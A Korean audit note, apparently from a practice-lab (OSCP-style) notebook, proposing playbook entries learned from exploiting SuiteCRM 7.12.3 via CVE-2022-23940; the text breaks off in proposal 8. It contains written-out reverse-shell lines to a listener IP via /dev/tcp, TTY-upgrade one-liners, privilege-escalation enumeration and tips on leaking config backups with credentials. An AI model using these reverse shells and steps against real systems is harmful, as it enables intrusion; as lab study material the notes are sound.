---
type: audit
target: "[[Crane]]"
wave: 14
date: 2026-08-26
manual_tags: true
manual_cves: true
manual_ports: true
ports: []
---
# Crane — `_PLAYBOOK` 이관 제안 (웨이브 14 소급 개작)

> [!warning] 이 파일은 중간 산출물이다
> 반영은 `pg-line-manager` 단독. 워커는 `_PLAYBOOK.md` 를 열지 않았다.
> 제안마다 **①어느 절 ②병합/신규 ③넣을 본문 ④지우기 전 원문**을 전부 적었다.
> 신규 제안은 번호를 비웠다 — 번호는 반영자가 충돌을 보고 배정한다. 노트에는 신규 앵커를 걸지 않았다.

**개작 전 원본**: `03. PG\_backup\Crane.md.bak2` (1049행 · 75900B)
**개작 후**: `03. PG\Crane.md` (579행)

---

## 제안 1 — `A-1-11. searchsploit 결과 읽는 법 — 0건도, 히트도 근거가 아니다`

**② 병합** (기존 절에 사례 append)

**③ 넣을 본문**

```markdown
**실측 사례 — [[Crane]] (SuiteCRM 7.12.3).** `searchsploit suitecrm` 이 7.10.7 · 7.11.15 · 7.11.18 **세 갈래만** 뱉었고 전부 타겟보다 낮은 버전이었음. 여기서 판단이 갈림:

- ❌ 「7.12.3 용 공개 익스플로잇이 없음 → 웹은 막다른 길 → 다른 포트를 판다」
- ✅ 「exploit-db 에 없을 뿐 → CVE 번호로 다시 검색」

`SuiteCRM 7.12.3 CVE` 웹 검색 한 번에 CVE-2022-23940 + GitHub PoC 가 바로 나옴. **이 박스에서 시간을 가장 크게 태울 뻔한 분기점이 여기였음.**

exploit-db 는 누군가 제출한 것만 담음. 2020년 이후 웹 앱 취약점은 상당수가 GitHub PoC 와 보안 어드바이저리로만 존재함.

**버전을 잡은 뒤의 검색 순서를 고정해 둘 것:**

1. `searchsploit <제품>` — 로컬 exploit-db. 가장 빠르지만 가장 안 나옴
2. `searchsploit -u` — DB 가 오래됐으면 결과가 비는 게 당연함
3. `<제품> <버전> CVE` 웹 검색 → NVD/어드바이저리에서 CVE 번호 확보
4. `CVE-XXXX-XXXXX github` → PoC 저장소
5. 제품 GitHub 의 릴리스 노트·커밋 diff — 「무엇을 고쳤는가」가 곧 「무엇이 취약한가」

3~5번을 건너뛰면 이 박스는 못 풂.
```

**④ 지우기 전 원문** (원본 1장 「searchsploit — 왜 DB 결과를 그대로 믿으면 안 되는가」 + 6장 ①)

> 전부 7.12.3보다 낮은 버전 대상이다. 타겟 버전 7.12.3에 맞는 것은 exploit-db가 아니라 CVE-2022-23940 (7.12.5에서 패치) 쪽이고, GitHub PoC를 써야 한다. **`searchsploit`에 안 나온다고 취약점이 없는 게 아니다** — 버전을 특정했으면 CVE 번호로 다시 검색한다.
>
> 버전을 잡은 뒤의 검색 순서는 고정해뒀다.
>
> 1. `searchsploit <제품>` — exploit-db 로컬 DB. 가장 빠르지만 가장 안 나온다
> 2. `searchsploit -u` — DB가 오래됐으면 결과가 비는 게 당연하다
> 3. `<제품> <버전> CVE` 웹 검색 → NVD/보안 어드바이저리에서 CVE 번호 확보
> 4. `CVE-XXXX-XXXXX github` → PoC 저장소
> 5. 제품 GitHub의 릴리스 노트/커밋 diff — "무엇을 고쳤는가"가 곧 "무엇이 취약한가"다
>
> 3~5번을 건너뛰면 이 박스는 못 푼다. exploit-db는 공개 익스플로잇의 일부일 뿐이다.

> ### ① `searchsploit`이 "익스플로잇 없음"으로 보이게 만들었다 — 실제 겪음
>
> `searchsploit suitecrm` 결과는 7.10.7 · 7.11.15 · 7.11.18 세 갈래뿐이었고 타겟은 7.12.3이다. 전부 낮은 버전이다.
>
> 여기서 판단이 갈린다:
>
> - **잘못된 결론**: "7.12.3용 공개 익스플로잇이 없다 → 웹은 막다른 길 → 다른 포트를 판다"
> - **옳은 결론**: "exploit-db에 없을 뿐이다 → CVE 번호로 다시 검색"
>
> 실제로 `SuiteCRM 7.12.3 CVE`로 검색하면 CVE-2022-23940과 GitHub PoC가 바로 나온다. 이 박스에서 시간을 가장 크게 태울 뻔한 분기점이 여기였다.
>
> exploit-db는 누군가 제출한 것만 담는다. 2020년 이후의 웹 앱 취약점은 상당수가 GitHub PoC와 보안 어드바이저리로만 존재한다. **`searchsploit`이 비면 "취약점 없음"이 아니라 "DB에 없음"으로 읽는다.**

---

## 제안 2 — `A-12. 응답이 성공을 뜻하지 않는다`

**② 병합**

**③ 넣을 본문**

```markdown
**「응답 없음」이 성공인 경우 — [[Crane]] (CVE-2022-23940 역직렬화 RCE).**

`exploit.py` 가 `INFO:CVE-2022-23940:Login did work - Trying to create scheduled report` 를 찍고 **그대로 굳어 타임아웃**됨. 완전한 실패로 보이는 화면임.

전형적 오판 흐름 — 스크립트 실패 → 페이로드 문법 의심 → base64 재생성 → 다른 PoC 저장소 탐색 → 익스플로잇 소스 수정. **여기서 30분이 날아감.**

실제 원인은 성공이었음:
- 역직렬화가 `Save` POST 를 처리하는 «도중» 인라인으로 발화함
- `system()` 이 리버스셸을 띄우고 그 프로세스가 HTTP 요청 스레드를 붙잡음
- 그래서 **HTTP 응답이 영영 반환되지 않음** → 스크립트 대기 → 타임아웃
- 스크립트 마지막의 `action=run` 트리거까지 갈 필요조차 없었음

**진단법 — 스크립트의 로그 «순서»를 읽을 것.** `exploit.py` 는 저 INFO 직후 Save POST 를 보내고, 응답이 오면 `Succesfully created scheduled report with id …` 를 찍음. 그 줄이 안 나왔다 = Save POST 가 반환되지 않았다.

⚠️ **익스플로잇을 던진 직후 확인 순서는 ① 리스너 → ② 스크립트 출력.** 거꾸로 하면 성공을 실패로 오독함.
응답도 받고 셸도 받고 싶으면 페이로드를 백그라운드로 분리 — `… | bash &` 또는 `nohup … &`([[Hawat]] 가 `bash -c "…" &` 를 쓴 이유).
```

**④ 지우기 전 원문** (원본 3-2 콜아웃 + 6장 ②)

> > [!warning] 여기서 멈춘 것처럼 보인다 — 실패가 아니다
> > 스크립트가 `Trying to create scheduled report`에서 그대로 굳고 결국 타임아웃된다.
> > 역직렬화가 `Save` POST 처리 도중 인라인으로 발화해서 리버스셸이 그 요청 안에서 붙어버리고, 그래서 HTTP 응답이 영영 반환되지 않기 때문이다.
> > 스크립트 마지막의 `action=run` 트리거까지 갈 필요조차 없다. **스크립트가 아니라 리스너를 봐라.**

> ### ② 익스플로잇이 "행"에 걸렸다 — 실제 겪음
>
> ```text
> INFO:CVE-2022-23940:Login did work - Trying to create scheduled report
> ```
> 여기서 스크립트가 굳고 결국 타임아웃됐다. **완전한 실패로 보이는 화면이다.**
>
> 전형적인 오판 흐름은 이렇다: 스크립트 실패 → 페이로드 문법 의심 → base64 다시 만들기 → 다른 PoC 저장소 탐색 → 익스플로잇 소스 수정… 여기서 30분이 날아간다.
>
> **실제 원인은 성공이었다:**
> - 역직렬화가 `Save` POST를 처리하는 도중 인라인으로 발화한다
> - `system()`이 리버스셸을 띄우고, 그 프로세스가 HTTP 요청 스레드를 붙잡는다
> - 그래서 **HTTP 응답이 영영 반환되지 않는다** → 스크립트가 대기 → 타임아웃
> - 스크립트 마지막의 `action=run` 트리거까지 갈 필요조차 없었다
>
> > [!warning] 원격 코드 실행에서 "응답 없음"은 성공의 신호일 수 있다
> > 셸을 띄우는 페이로드는 요청을 반환시키지 않는 것이 오히려 정상이다.
> > **익스플로잇을 던진 직후 확인 순서는 ① 리스너 → ② 스크립트 출력.** 순서를 거꾸로 하면 성공을 실패로 오독한다.
> > 응답을 받으면서 셸도 받고 싶으면 페이로드를 백그라운드로 분리한다 — `... | bash &` 또는 `nohup ... &`. [[Hawat]]에서 `bash -c "..." &`를 쓴 이유가 정확히 이것이다.
> >
> > 누적 패턴: "응답이 성공을 뜻하지 않는다" — [[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Hawat]]

원본 1장의 같은 계열 서술도 함께 이관한다:

> 이 목록은 상태코드만 보면 그대로 오독한다.
>
> - `200 (23c) = "Not A Valid Entry Point"` — 200인데 거부 응답이다. 크기(23바이트)를 안 보면 "노출된 엔드포인트"로 착각한다. **feroxbuster/gobuster 결과는 상태코드가 아니라 응답 길이로 1차 분류**한다
> - `500` — 서버 오류지 "막혔다"가 아니다. `cron.php`가 CLI 전용이라 웹에서 부팅에 실패한 것뿐
> - 1085행 중 유의미한 것은 20행 미만이다. CMS를 상대로 한 디렉터리 브루트포스는 대부분 vendor 노이즈고, 제품이 특정된 순간 우선순위가 내려간다

(⚠️ 위 세 불릿의 «요지»는 노트 `Service Enumeration` 절에 실측 근거와 함께 남겼다. 일반화만 이관 대상이다.)

원본 3-1 의 로그인 판정 서술도 같은 패턴:

> 로그인 성공/실패 판정은 상태코드와 `Location` 헤더로 한다. 실패 시 SuiteCRM은 `Location: index.php?module=Users&action=Login&loginErrorMessage=...` 로 되돌린다. 200 본문 길이 비교보다 확실하다.
> 이것도 "응답이 성공을 뜻하지 않는다" 패턴이다. 200이 성공이 아니고 302가 실패가 아니다 — 어디로 보내는지를 봐야 한다.

---

## 제안 3 — `A-31. 리버스셸이 안 붙는다`

**② 병합** — 특히 **`sh` vs `bash` 실패의 «두 층» 구분**은 Kali 실측 출력이 있어 값이 크다.

**③ 넣을 본문**

````markdown
**`/dev/tcp` 는 bash 전용 — 그리고 dash 에서 실패하는 «층이 둘»이다.** 이 구분이 디버깅에서 갈린다. Kali 에서 직접 때린 것:

```text
$ /bin/sh -c 'bash -i >& /dev/tcp/127.0.0.1/9 0>&1'
/bin/sh: 1: Syntax error: Bad fd number          (rc=2)

$ dash -c 'echo hi > /dev/tcp/127.0.0.1/9'
dash: 1: cannot create /dev/tcp/127.0.0.1/9: Directory nonexistent   (rc=2)
```

| 층 | 무엇이 죽는가 | 증상 |
|---|---|---|
| ① 문법 파싱 | dash 에서 `>&` 는 fd 복제 전용이라 `/dev/tcp/...` 같은 파일명을 못 받음 | `Syntax error: Bad fd number` — **`/dev/tcp` 에 도달조차 못 함** |
| ② 가상 장치 부재 | `>` 하나로 바꿔 문법을 통과시켜도 dash 에는 `/dev/tcp` 가상 장치 자체가 없음(bash 가 리다이렉션을 가로채 소켓을 여는 기능이지 실제 파일이 아님) | `cannot create /dev/tcp/...: Directory nonexistent` |

결론 — 마지막 파이프가 반드시 **`| bash`** 여야 함. PHP `system()` 이 내부적으로 `/bin/sh -c` 를 쓰므로, `bash` 로 명시적으로 넘기는 이 한 겹이 없으면 셸이 안 붙음([[Crane]] 에서 이 형태로 성공).

**에러 문구는 기억으로 쓰지 말고 한 번 때려보고 적을 것.** 문구가 다르면 검색어가 달라진다.

**의심 순서** — ① 아웃바운드 포트 차단 → ② `sh` vs `bash` → ③ `/dev/tcp` 미지원 빌드(`--disable-net-redirections` 로 컴파일된 bash) → ④ IP/포트 오타. **②가 가장 흔하고 가장 늦게 발견됨.**

| 의심 순서 | 확인 방법 |
|---|---|
| 1. `sh` vs `bash` | 증상으로 구분 — `Syntax error: Bad fd number` = `>&` 파싱 실패, `cannot create /dev/tcp/...: Directory nonexistent` = 가상 장치 부재 |
| 2. 아웃바운드 포트 차단 | 4444 가 막혔으면 443·80·53 시도. **1024 미만 리스너는 `sudo` 필요**([[Hawat]] 실제 함정) |
| 3. 인용 중첩으로 페이로드 파손 | base64 래핑 또는 hex 리터럴(B-81) |
| 4. IP/포트 오타 | 리스너 IP 는 `ip a` 의 **tun0** 주소여야 함. 랜 주소를 넣으면 영영 안 옴 |
| 5. 셸은 붙었는데 즉시 끊김 | `bash -i` 누락(비대화형이라 즉시 종료) 또는 `0>&1` 누락(stdin 미연결) |

**최소 확인법** — 리버스셸 대신 `curl http://<내IP>/ping` 또는 `ping -c1 <내IP>` 를 먼저 실행시켜 아웃바운드가 나가는지만 봄. 페이로드 문제와 네트워크 문제를 분리하는 가장 빠른 방법.

**출처** — [[Crane]] (이 박스에서는 4444 로 한 번에 붙었음. 위 점검 순서는 같은 유형 재조우 대비).
````

**④ 지우기 전 원문** (원본 2-3 콜아웃 + 6장 ⑤ + 7장 7)

> > [!warning] `/dev/tcp`는 bash 전용이다 — `sh`로는 안 되고, 실패하는 층이 둘이다
> > `/bin/sh`가 dash인 데비안 계열에서 실제로 무엇이 나오는지 Kali에서 때려봤다:
> >
> > ```
> > $ /bin/sh -c 'bash -i >& /dev/tcp/127.0.0.1/9 0>&1'
> > /bin/sh: 1: Syntax error: Bad fd number          (rc=2)
> >
> > $ dash -c 'echo hi > /dev/tcp/127.0.0.1/9'
> > dash: 1: cannot create /dev/tcp/127.0.0.1/9: Directory nonexistent   (rc=2)
> > ```
> >
> > 두 실패는 층이 다르고, 이 구분이 디버깅에서 갈린다:
> >
> > | 층 | 무엇이 죽는가 | 증상 |
> > |---|---|---|
> > | ① 문법 파싱 | dash에서 `>&`는 fd 복제 전용이라 `/dev/tcp/...` 같은 파일명을 받지 못한다 | `Syntax error: Bad fd number` — **`/dev/tcp`에 도달조차 못 한다** |
> > | ② 가상 장치 부재 | `>` 하나로 바꿔 문법을 통과시켜도, dash에는 `/dev/tcp` 가상 장치 자체가 없다(bash가 리다이렉션을 가로채 소켓을 여는 기능이지 실제 파일이 아니다) | `cannot create /dev/tcp/...: Directory nonexistent` |
> >
> > 결론은 그대로다 — 마지막 파이프가 반드시 **`| bash`** 여야 한다. `system()`이 내부적으로 `/bin/sh -c`를 쓰기 때문에, `bash`로 명시적으로 넘기는 이 한 겹이 없으면 셸이 안 붙는다.
> > 리버스셸이 안 붙을 때 의심 순서: ① 아웃바운드 포트 차단 → ② `sh` vs `bash` → ③ `/dev/tcp` 미지원 빌드(`--disable-net-redirections`로 컴파일된 bash) → ④ IP/포트 오타. ②가 가장 흔하고 가장 늦게 발견된다.
> >
> > 에러 문구는 기억으로 쓰지 말고 한 번 때려보고 적는다. 문구가 다르면 검색어가 달라진다.

> ### ⑤ 이 유형에서 흔히 막히는 지점 — 리버스셸이 안 붙는다
>
> *(이 박스에서는 4444로 한 번에 붙었다. 아래는 같은 유형을 다시 만났을 때의 점검 순서다.)*
>
> | 의심 순서 | 확인 방법 |
> |---|---|
> | 1. **`sh` vs `bash`** | `system()`은 `/bin/sh -c`로 실행된다. 데비안의 `sh`는 dash다. 증상으로 구분한다 — `Syntax error: Bad fd number` 면 `>&`를 파싱하지 못한 것이고, `cannot create /dev/tcp/...: Directory nonexistent` 면 `/dev/tcp` 가상 장치가 없는 것이다(2-3 참조). 어느 쪽이든 답은 하나, 반드시 `\| bash`로 넘긴다 |
> | 2. 아웃바운드 포트 차단 | 4444가 막혔으면 443·80·53을 시도. **1024 미만 리스너는 `sudo` 필요** ([[Hawat]]에서 실제로 이 함정) |
> | 3. 인용 중첩으로 페이로드 파손 | base64 래핑 또는 hex 리터럴로 회피 |
> | 4. IP/포트 오타 | 리스너 IP는 `ip a`의 **VPN 인터페이스(tun0)** 주소여야 한다. 랜 주소를 넣으면 영영 안 온다 |
> | 5. 셸은 붙었는데 즉시 끊긴다 | `bash -i` 누락(비대화형이라 즉시 종료) 또는 `0>&1` 누락(stdin 미연결) |
>
> 최소 확인법은 리버스셸 대신 `curl http://<내IP>/ping` 또는 `ping -c1 <내IP>`를 먼저 실행시켜 아웃바운드가 나가는지만 보는 것이다. 페이로드 문제와 네트워크 문제를 분리하는 가장 빠른 방법이다.

원본 2-3 의 리버스셸 조각 표도 같은 절로:

> | 조각 | 역할 |
> |---|---|
> | `bash -i` | 대화형 셸. 없으면 프롬프트가 안 뜨고 입력이 안 먹는다 |
> | `>& /dev/tcp/192.168.45.207/4444` | stdout+stderr를 TCP 소켓으로 리다이렉트. `/dev/tcp`는 실제 파일이 아니라 bash 내장 가상 장치다 |
> | `0>&1` | stdin을 같은 소켓에 연결 → 양방향 완성 |

---

## 제안 4 — `A-38. \`python3\` 가 없어 TTY 업그레이드가 안 된다`

**② 병합** — 증상별 표를 append.

**③ 넣을 본문**

```markdown
**TTY 부재는 증상이 다양하지만 원인은 하나다.** 리버스셸은 붙었는데 `sudo` 가 `no tty present` 를 뱉거나, Ctrl+C 가 셸 자체를 죽이거나, `su`/`ssh` 가 비밀번호를 못 받는 상황이 전부 여기임.

| 증상 | 원인 | 대응 |
|---|---|---|
| `sudo: no tty present and no askpass program specified` | TTY 부재 | `pty.spawn` 또는 `script -qc /bin/bash /dev/null` |
| Ctrl+C 가 리버스셸 전체를 종료 | 시그널이 nc 로 감 | `stty raw -echo` 후 `fg` |
| `clear`·`vim`·`less` 가 깨짐 | `TERM` 미설정 | `export TERM=xterm` |
| 탭 완성 안 됨 | raw 모드 미적용 | Ctrl+Z → `stty raw -echo; fg` → Enter 두 번 |
| `python3: command not found` | 최소 설치 | `script -qc /bin/bash /dev/null` · `perl -e 'exec "/bin/bash";'` · `/usr/bin/expect -c 'spawn /bin/bash; interact'`([[Hawat]] 실제 사례) |

**업그레이드 3단 세트:**

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"   # ① 의사 터미널 확보
export TERM=xterm                                 # ② clear/vim/less 동작
# (선택) Ctrl+Z → stty raw -echo; fg → 탭완성·Ctrl+C 정상화
```

**발화 신호** — `bash: cannot set terminal process group (610): Inappropriate ioctl for device` + `bash: no job control in this shell`. 이게 보이면 위 3단을 반사적으로 칠 것.
```

**④ 지우기 전 원문** (원본 3-2 말미 + 6장 ⑧)

> TTY 업그레이드 3단 세트는 이렇다.
>
> ```bash
> python3 -c "import pty;pty.spawn('/bin/bash')"   # ① 의사 터미널 확보
> export TERM=xterm                                 # ② clear/vim/less가 동작
> # (선택) Ctrl+Z → stty raw -echo; fg → 탭완성·Ctrl+C 정상화
> ```
> `bash: cannot set terminal process group ... no job control` 메시지가 **TTY가 없다는 증거**다. 이게 보이면 위 3단을 반사적으로 친다.
> `python3`가 없는 박스라면 `script -qc /bin/bash /dev/null` — [[Hawat]]에서 실제로 그랬다.

> ### ⑧ 이 유형에서 흔히 막히는 지점 — 셸을 잡았는데 명령이 안 먹는다
>
> *(이 박스는 `python3 -c "import pty..."` 한 번에 정상화됐다.)*
>
> 리버스셸은 붙었는데 `sudo`가 `no tty present`를 뱉거나, Ctrl+C가 셸 자체를 죽이거나, `su`/`ssh`가 비밀번호를 못 받는 상황이 이 유형의 다음 관문이다. 원인은 전부 **TTY가 없다** 하나다.
>
> | 증상 | 원인 | 대응 |
> |---|---|---|
> | `sudo: no tty present and no askpass program specified` | TTY 부재 | `pty.spawn` 또는 `script -qc /bin/bash /dev/null` |
> | Ctrl+C가 리버스셸 전체를 종료 | 시그널이 nc로 간다 | `stty raw -echo` 후 `fg` |
> | `clear`·`vim`·`less`가 깨짐 | `TERM` 미설정 | `export TERM=xterm` |
> | 탭 완성 안 됨 | raw 모드 미적용 | Ctrl+Z → `stty raw -echo; fg` → Enter 두 번 |
> | `python3: command not found` | 최소 설치 | `script -qc /bin/bash /dev/null` · `perl -e 'exec "/bin/bash";'` · `/usr/bin/expect -c 'spawn /bin/bash; interact'` ([[Hawat]]에서 실제 사례) |

---

## 제안 5 — 신규 `A-?` : `sudo -l` 이 「권한 없음」으로 보이는데 실은 TTY 문제다

**② 신규** (A-4 권한상승 절 · 번호는 반영자 배정)

**③ 넣을 본문**

```markdown
**증상** — 리버스셸에서 `sudo -l` 을 쳤는데 비밀번호를 묻거나 `no tty present` 로 죽음. 「이 계정엔 sudo 권한이 없다」고 판단하고 SUID·cron 으로 넘어감.

**권한 문제와 TTY 문제는 전혀 다른 실패인데 겉보기가 비슷함.**

- **TTY 업그레이드를 먼저 하고 열거를 시작할 것.** 순서가 뒤바뀌면 단서를 놓침
- [[Crane]] 에서 `sudo` 가 통한 이유는 `pty.spawn` 으로 TTY 를 이미 확보한 뒤에 `sudo -l` 을 쳤기 때문임. **순서를 바꿔 raw 셸에서 바로 쳤다면 `no tty present` 로 막혀 「sudo 권한이 없다」고 오판했을 것**

**비밀번호를 진짜로 요구하는 경우의 대안:**

- **`sudo -n -l`** — 비대화형 확인. 프롬프트 없이 즉시 실패해 시간을 안 태움
- `/etc/sudoers`·`/etc/sudoers.d/*` 를 읽을 수 있는지 확인(가끔 world-readable)
- SUID(`find / -perm -4000`) · capabilities(`getcap -r /`) · 크론 · 쓰기 가능한 서비스 파일로 경로 전환
```

**④ 지우기 전 원문** (원본 6장 ⑦ + ⑧ 말미 콜아웃)

> ### ⑦ 이 유형에서 흔히 막히는 지점 — `sudo -l`이 비밀번호를 요구한다
>
> `www-data`는 비밀번호를 모르는 계정이다. `sudo -l`이 암호를 물으면 **그 자리에서 막힌다.**
>
> 이 박스는 `NOPASSWD`라 통과했지만, 물어보는 경우의 대안:
>
> - **`sudo -n -l`** — 비대화형 확인. 프롬프트 없이 즉시 실패해 시간을 안 태운다
> - `/etc/sudoers`·`/etc/sudoers.d/*`를 읽을 수 있는지 확인 (가끔 world-readable이다)
> - SUID(`find / -perm -4000`) · capabilities(`getcap -r /`) · 크론 · 쓰기 가능한 서비스 파일로 경로를 갈아탄다

> 이 박스에서 `sudo`가 통한 이유는 `pty.spawn`으로 TTY를 이미 확보한 뒤에 `sudo -l`을 쳤기 때문이다. **순서를 바꿔 raw 셸에서 바로 `sudo -l`을 쳤다면 `no tty present`로 막혀 "sudo 권한이 없다"고 오판했을 것이다.**
>
> > [!warning] `sudo -l`이 실패했다고 sudo 권한이 없는 것이 아니다
> > 권한 문제와 TTY 문제는 전혀 다른 실패인데 겉보기가 비슷하다.
> > **TTY 업그레이드를 먼저 하고 열거를 시작한다.** 순서가 뒤바뀌면 단서를 놓친다.

---

## 제안 6 — 신규 `A-?` : 인스톨러 잔존물은 대개 함정이다 — 5분 상한

**② 신규** (A-2 진입 절)

**③ 넣을 본문**

```markdown
**증상** — 웹루트에 `install.log`·`install.php`·`installer/` 가 그대로 서빙됨. 「여기가 길」로 보임.

**실측 — [[Crane]].** `/install.log` 가 51295바이트 설치 로그 전문을 뱉었음. 안에 있던 것:

| 조사한 것 | 결과 |
|---|---|
| `/install.log` (51KB 전량 확인) | 설치일 2023-08-24, DB 드라이버·XML 파서·ZIP 지원 부재 ERROR 와 설치 진행 로그뿐. `password` 문자열은 44행 등장하나 **전부 「The provided database host, username, and/or password is invalid」 한 문구의 반복이고 값은 없음** |
| `/install.php` | `installer_locked => true` — 재설치 불가 `[가정 — 산출물 미보존]` |
| `/config.php`, `/config_override.php` | 0바이트. PHP 가 정상 파싱함, 유출 없음 `[가정 — 산출물 미보존]` |

설치 로그 노출은 실무 침투 테스트에서는 보고 가치가 있는 정보 노출이지만 **피벗 대상은 아니었음.** 정답은 이미 손에 있던 버전 정보였음.

**손절 기준을 미리 정해 둘 것** — 인스톨러 계열은 잠금 플래그를 **한 번만** 확인하고 잠겨 있으면 **5분 안에 접는다.**

| 제품 | 잠금 지표 |
|---|---|
| SuiteCRM / SugarCRM | `installer_locked` |
| Nextcloud | `installed.lock` |
| WordPress | `wp-config.php` 존재 여부 |

**일반화** — 인스톨러 잔존물·설치 로그·디렉터리 리스팅·내부 IP 누출은 **정보 노출 보고서 항목이지 반드시 익스플로잇 경로는 아님.** 열려 보이는 것과 길은 다름.

**PHP 앱이면 대신 이쪽을 찌를 것** — `config.php`·`config.inc.php`·`.env`·`config.php.bak`·`config.php~`. `.bak`/`~`/`.old` 확장자는 PHP 로 파싱되지 않아 평문으로 떨어짐(그래서 feroxbuster `-x` 에 `bak` 을 넣음).
⚠️ **`config.php` 가 0바이트로 오는 것은 정상이자 나쁜 신호임** — 서버가 정상 파싱했다는 뜻. 여기서 **평문이 보였다면 PHP 핸들러가 죽은 것**이고 그게 곧 DB 자격증명 유출임.
```

**④ 지우기 전 원문** (원본 1장 노출 파일 서술 + 6장 ③)

> `/install.log`는 51KB짜리 설치 로그가 그대로 서빙되는 정보 노출이지만, 안에 있는 것은 DB 드라이버 부재 에러와 설치 진행 로그뿐이다. 자격증명은 없어서 사실상 함정에 가깝다.
>
> `/config.php`가 0바이트로 온 것은 나쁜 신호다. PHP 파일을 요청해서 0바이트가 오면 서버가 정상적으로 파싱했다는 뜻이다(출력이 없는 순수 배열 정의 파일이므로). 여기서 **평문이 그대로 보였다면 PHP 핸들러가 죽은 것**이고, 그게 곧 DB 자격증명 유출이다.
> PHP 앱을 만나면 `config.php`·`config.inc.php`·`.env`·`config.php.bak`·`config.php~`를 반드시 찔러본다. `.bak`/`~`/`.old` 확장자는 PHP로 파싱되지 않아 평문으로 떨어진다 — feroxbuster의 `-x php,txt,html,bak,zip`에 `bak`을 넣은 이유가 이것이다.

> ### ③ 인스톨러 잔존물이라는 함정 — 실제 겪음
>
> `/install.log`가 51KB짜리 설치 로그 전문을 그대로 뱉는다. 여기가 길인 것처럼 보인다.
>
> 실제로는:
>
> | 조사한 것 | 결과 | 근거 |
> |---|---|---|
> | `/install.log` (51KB 전량 확인) | 설치일 2023-08-24, DB 드라이버·XML 파서 부재 ERROR 와 설치 진행 로그뿐. 평문 자격증명 없음 | ✅ 실측 (`~/PG/Crane/install.log` 51295바이트) |
> | `/install.php` | `installer_locked => true` — 재설치 불가 | `[가정 — 산출물 미보존]` |
> | `/config.php`, `/config_override.php` | 0바이트. PHP가 정상 파싱함, 유출 없음 | `[가정 — 산출물 미보존]` |
>
> 설치 로그 노출은 실제 침투 테스트에서는 보고 가치가 있는 정보 노출이지만, **이 박스에서는 피벗할 대상이 아니었다.**
>
> 인스톨러 잔존물·설치 로그·디렉터리 리스팅·내부 IP 누출은 정보 노출 보고서 항목이지 반드시 익스플로잇 경로는 아니다(이 박스에서 실제로 확인된 것은 `install.log` 하나다). **열려 보이는 것과 길은 다르다.**
> 그래서 손절 기준을 미리 정해둔다 — 인스톨러 계열은 `installer_locked`(SuiteCRM/SugarCRM)·`installed.lock`(Nextcloud)·`CONFIG_FILE 존재 여부`(WordPress)를 한 번만 확인하고, 잠겨 있으면 5분 안에 접는다. 이 박스에서는 접는 판단이 옳았고, 정답은 이미 손에 있던 버전 정보였다.

⚠️ 「자격증명 없음」의 근거를 개작 중 **강화**했다 — 원본은 「전수 grep 결과 자격증명 0건」이었으나 실제로는 `password` 문자열이 44행 있고 전부 동일 에러 문구다. 넣을 본문 쪽이 정확하다.

---

## 제안 7 — 신규 `A-?` : `/home` 이 비어 user 플래그를 못 찾는다

**② 신규** (A-4 또는 C-3 인접. 반영자 판단)

**③ 넣을 본문**

```markdown
**증상** — `ls -la /home/` 결과가 `.` 과 `..` 둘뿐. 일반 사용자 계정이 아예 없음.

「user 플래그를 얻으려면 먼저 어떤 사용자로 수평 이동해야 한다」고 가정하면 `/etc/passwd` 를 뒤지고 자격증명을 찾느라 시간을 태움.

**실측 — [[Crane]].** 플래그는 `www-data` 가 그대로 읽을 수 있는 `/var/www/local.txt` 에 있었음. **서비스 계정만 있는 구성에서는 서비스 홈에 놓임.**

**플래그는 위치를 추측하지 말고 파일명으로 찾을 것:**

```bash
find / -name local.txt 2>/dev/null
find / -name proof.txt 2>/dev/null
find / -xdev \( -name 'local.txt' -o -name 'proof.txt' -o -name 'user.txt' -o -name 'root.txt' \) 2>/dev/null
```

- `2>/dev/null` — 비특권 셸이 `/proc`·`/root` 를 훑으며 뱉는 `Permission denied` 수천 줄을 버림. 빼면 에러가 화면을 덮어 결과 한 줄을 놓침
- `-xdev` — 다른 파일시스템으로 넘어가지 않음. `/proc`·`/sys`·NFS 마운트를 훑느라 느려지는 것을 막음(A-42 의 죽은 NFS 마운트 함정과 같은 이유)

**「user 플래그가 없다 = 아직 수평 이동이 남았다」는 가정이 틀릴 수 있음.**
```

**④ 지우기 전 원문** (원본 5장 + 6장 ④)

> 일반 유저 계정 없이 서비스 계정만 있는 박스에서는 플래그가 서비스 홈 디렉터리(`/var/www`)에 놓인다. `/home`이 비었다고 당황할 게 아니라 `find / -name local.txt 2>/dev/null`을 반사적으로 친다.
>
> `2>/dev/null`은 stderr(=권한 없는 디렉터리의 `Permission denied` 수천 줄)를 버린다. 이걸 빼면 `www-data` 권한으로 `/proc`·`/root`를 훑다가 에러가 화면을 덮어 정작 결과 한 줄을 놓친다. 비특권 셸에서 `find /`를 칠 때는 예외 없이 붙인다.

> ### ④ `/home`이 비어 있어 user 플래그를 못 찾을 뻔했다 — 실제 겪음
>
> `ls -la /home/` 결과가 `.`과 `..` 둘뿐이었다. 일반 사용자 계정이 아예 없다.
>
> "user 플래그를 얻으려면 먼저 어떤 사용자로 수평 이동해야 한다"고 가정하면 `/etc/passwd`를 뒤지고 자격증명을 찾느라 시간을 태운다. 실제로는 `www-data` 그대로 읽을 수 있는 위치에 있었다:
>
> ```text
> /var/www/local.txt
> ```
>
> **플래그는 위치를 추측하지 말고 파일명으로 찾는다.**
>
> ```bash
> find / -name local.txt 2>/dev/null
> find / -name proof.txt 2>/dev/null
> find / -xdev \( -name 'local.txt' -o -name 'proof.txt' -o -name 'user.txt' -o -name 'root.txt' \) 2>/dev/null
> ```
> `-xdev`는 다른 파일시스템으로 넘어가지 않게 한다 — `/proc`·`/sys`·NFS 마운트를 훑느라 느려지는 것을 막는다.
> **"user 플래그가 없다 = 아직 수평 이동이 남았다"는 가정이 틀릴 수 있다.** 서비스 계정만 있는 구성에서는 서비스 홈에 놓인다.

---

## 제안 8 — 신규 `A-?` : 역직렬화 가젯 체인이 «에러 없이» 죽는다

**② 신규** (A-2 진입 절)

**③ 넣을 본문**

```markdown
**증상** — 페이로드를 보냈는데 아무 일도 안 일어남. **에러 메시지가 없어서** 디버깅이 어려움. 가젯 체인은 터지거나 아무 일도 안 일어나거나 둘 중 하나임.

| 원인 | 대응 |
|---|---|
| 라이브러리 **버전 불일치** — 체인이 특정 버전의 클래스 구조를 전제 | `phpggc -l <라이브러리>` 로 RCE1/RCE2/RCE3… 를 순서대로 전부 시도 |
| 대상 라이브러리가 번들되지 않음 | `vendor/composer/installed.json` 을 읽을 수 있으면 확인. 못 읽으면 Monolog → Guzzle → Symfony 순 |
| `__destruct` 가 예외로 중단 | 다른 체인으로 교체 |
